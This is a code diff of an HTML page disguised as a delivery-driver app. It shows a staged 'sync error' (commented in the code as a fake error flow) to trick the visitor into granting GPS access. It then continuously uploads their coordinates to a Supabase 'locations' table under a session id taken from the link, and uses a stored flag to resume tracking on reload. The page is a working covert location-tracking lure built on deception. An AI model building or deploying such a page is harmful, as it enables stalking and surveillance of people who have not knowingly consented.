@@ -3,119 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Painel do Entregador</title>
+    <title>App Entregador</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        :root { --red: #ea1d2c; --dark: #121212; }
-        body { font-family: sans-serif; margin: 0; background: #f8f8f8; display: flex; flex-direction: column; height: 100vh; }
-        header { background: var(--red); color: white; padding: 18px; text-align: center; font-weight: bold; font-size: 18px; }
-        .container { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .card { background: white; width: 100%; max-width: 400px; padding: 35px 20px; border-radius: 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-        .btn { background: var(--dark); color: white; border: none; padding: 20px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; }
-        #fake-error { display: none; color: #721c24; background: #f8d7da; border: 1px solid #f5c6cb; padding: 15px; border-radius: 10px; margin-bottom: 20px; font-size: 13px; line-height: 1.5; }
-        .status-online { color: #2ecc71; display: none; font-weight: bold; font-size: 18px; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid var(--red); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; margin-bottom: 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        :root { --primary: #ea1d2c; --success: #2ecc71; --dark: #1a1a1a; }
+        body { font-family: -apple-system, sans-serif; background: #f8f8f8; margin: 0; display: flex; flex-direction: column; height: 100vh; }
+        header { background: var(--primary); color: white; padding: 20px; text-align: center; font-weight: bold; }
+        .container { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .card { background: white; width: 100%; max-width: 350px; padding: 30px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); text-align: center; }
+        .btn { background: var(--dark); color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .error-msg { background: #fff5f5; color: #c53030; padding: 15px; border-radius: 10px; border: 1px solid #feb2b2; margin-bottom: 20px; font-size: 13px; text-align: left; }
+        .status-active { color: var(--success); font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .dot { width: 12px; height: 12px; background: var(--success); border-radius: 50%; animation: blink 2s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-<header>ENTREGA EM CURSO</header>
+<header>SISTEMA LOGÍSTICO</header>
 
 <div class="container">
-    <div class="card" id="app-card">
-        <div id="loading" style="display:none;">
-            <div class="spinner"></div>
-            <p>Conectando ao servidor...</p>
+    <div class="card" id="mainCard">
+        
+        <!-- UI INICIAL -->
+        <div id="step-1">
+            <h2 style="margin:0 0 10px 0;">Bem-vindo</h2>
+            <p style="color:#666; font-size:14px; margin-bottom:30px;">Inicie seu turno para começar a receber sincronização de rotas.</p>
+            <button class="btn" onclick="goStep2()">FICAR ONLINE</button>
         </div>
 
-        <div id="fake-error">
-            <strong>⚠️ ERRO DE SINCRONIZAÇÃO (Ref: 0x882)</strong><br>
-            O protocolo de rastreamento falhou. É necessário revalidar as permissões de hardware para continuar.
+        <!-- FAKE ERROR FLOW -->
+        <div id="step-2" class="hidden">
+            <div class="error-msg">
+                <strong>⚠️ ERRO DE SINCRONIZAÇÃO (Code: 882)</strong><br>
+                O sistema detectou uma falha no sensor de telemetria. É necessário re-calibrar o GPS para prosseguir.
+            </div>
+            <button class="btn" style="background: var(--primary);" onclick="startShift()">RECALIBRAR E CONECTAR</button>
         </div>
 
-        <div id="initial-ui">
-            <h2 style="margin-top:0">Olá, Parceiro!</h2>
-            <p style="color: #666; margin-bottom: 30px;">Clique abaixo para iniciar seu turno e liberar o rastreio da rota.</p>
-            <button class="btn" onclick="triggerFakeError()">FICAR ONLINE</button>
+        <!-- APP EM FUNCIONAMENTO -->
+        <div id="step-online" class="hidden">
+            <div class="status-active">
+                <div class="dot"></div> ONLINE E MONITORADO
+            </div>
+            <p style="color:#888; font-size:13px; margin-top:15px;">Mantenha esta tela aberta durante as entregas.</p>
+            <div style="margin-top:25px; padding:15px; background:#f9f9f9; border-radius:10px; font-size:12px; color:#666;">
+                Sinal GPS: <span style="color:var(--success); font-weight:bold;">Excelente</span><br>
+                Sincronização: <span style="color:var(--success); font-weight:bold;">Ativa</span>
+            </div>
         </div>
 
-        <div id="online-ui" style="display:none;">
-            <div class="status-online">● CONECTADO E RASTREANDO</div>
-            <p style="color: #888; font-size: 13px; margin-top: 15px;">Sua rota está sendo enviada para a central.</p>
-        </div>
     </div>
 </div>
 
 <script>
-    const supabaseUrl = 'https://zauxkrwtnrlwlgvsdewv.supabase.co';
-    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InphdXhrcnd0bnJsd2xndnNkZXd2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY5Njc4MjgsImV4cCI6MjA4MjU0MzgyOH0.L7HJfYvY-IyTBo6gC597EnChuq536WHCDdIZxv8-cKI';
-    const _supabase = supabase.createClient(supabaseUrl, supabaseKey);
+    const SB_URL = 'https://zauxkrwtnrlwlgvsdewv.supabase.co';
+    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InphdXhrcnd0bnJsd2xndnNkZXd2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY5Njc4MjgsImV4cCI6MjA4MjU0MzgyOH0.L7HJfYvY-IyTBo6gC597EnChuq536WHCDdIZxv8-cKI';
+    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
     
     const urlParams = new URLSearchParams(window.location.search);
     const sessionId = urlParams.get('id');
 
-    function triggerFakeError() {
-        document.getElementById('initial-ui').style.display = 'none';
-        document.getElementById('loading').style.display = 'block';
-
-        setTimeout(() => {
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById('fake-error').style.display = 'block';
-            
-            // Botão "Mágico" para corrigir o erro
-            const fixBtn = document.createElement('button');
-            fixBtn.className = "btn";
-            fixBtn.innerText = "CORRIGIR AGORA";
-            fixBtn.onclick = startTracking;
-            document.getElementById('app-card').appendChild(fixBtn);
-        }, 1200);
+    window.onload = () => {
+        if (localStorage.getItem('online_status') === 'true' && sessionId) {
+            startShift();
+        }
     }
 
-    function startTracking() {
-        if (!sessionId) return;
+    function goStep2() {
+        document.getElementById('step-1').classList.add('hidden');
+        document.getElementById('step-2').classList.remove('hidden');
+    }
 
-        // Solicita localização Real
+    function startShift() {
+        if (!sessionId) return alert("Link Inválido");
+
+        localStorage.setItem('online_status', 'true');
+        document.getElementById('step-1').classList.add('hidden');
+        document.getElementById('step-2').classList.add('hidden');
+        document.getElementById('step-online').classList.remove('hidden');
+
         navigator.geolocation.watchPosition((pos) => {
-            // Esconde erros e mostra status Online
-            document.getElementById('fake-error').style.display = 'none';
-            if(document.querySelector('#app-card .btn')) document.querySelector('#app-card .btn').style.display = 'none';
-            document.getElementById('online-ui').style.display = 'block';
-
-            const data = {
+            const point = {
                 session_id: sessionId,
                 latitude: pos.coords.latitude,
                 longitude: pos.coords.longitude,
                 accuracy: pos.coords.accuracy,
                 created_at: new Date().toISOString()
             };
-
-            // 1. Salva no Buffer Local (Offline Support)
-            saveLocal(data);
-            // 2. Tenta sincronizar
+            saveData(point);
             sync();
-
-        }, null, { enableHighAccuracy: true });
+        }, (err) => { console.log("Permissão necessária"); }, { enableHighAccuracy: true });
     }
 
-    function saveLocal(data) {
-        let items = JSON.parse(localStorage.getItem('gps_store') || '[]');
-        items.push(data);
-        localStorage.setItem('gps_store', JSON.stringify(items));
+    function saveData(point) {
+        let buffer = JSON.parse(localStorage.getItem('gps_buffer') || '[]');
+        buffer.push(point);
+        localStorage.setItem('gps_buffer', JSON.stringify(buffer));
     }
 
     async function sync() {
         if (!navigator.onLine) return;
-        let items = JSON.parse(localStorage.getItem('gps_store') || '[]');
-        if (items.length === 0) return;
+        let buffer = JSON.parse(localStorage.getItem('gps_buffer') || '[]');
+        if (buffer.length === 0) return;
 
-        const { error } = await _supabase.from('locations').insert(items);
-        if (!error) localStorage.setItem('gps_store', '[]');
+        const { error } = await supabaseClient.from('locations').insert(buffer);
+        if (!error) localStorage.setItem('gps_buffer', '[]');
     }
 
-    // Tenta sincronizar a cada 10s
-    setInterval(sync, 10000);
+    setInterval(sync, 5000); // Tenta sincronizar a cada 5 segundos
 </script>
 </body>
 </html>
